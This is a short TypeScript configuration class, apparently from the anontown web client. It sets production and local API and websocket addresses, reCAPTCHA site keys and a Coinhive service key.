import { environment } from '../environments/environment';

export class Config {
  static serverURL = environment.production ? 'https://api.anontown.com' : 'http://localhost:8080';
  static socketServerURL = environment.production ? 'wss://api.anontown.com' : 'ws://localhost:8080';
  static recaptcha = environment.production ? '6LdoFBQUAAAAACc3lhPhbkEANEAHsmNd6UDN2vKo' : '6LeoFBQUAAAAAB0fiXvXvaBO9VyFC7igegEOlD7a';
  static coinhive = "Zo2rps5kYDux3cSlc7viocgxGvTveti4";
}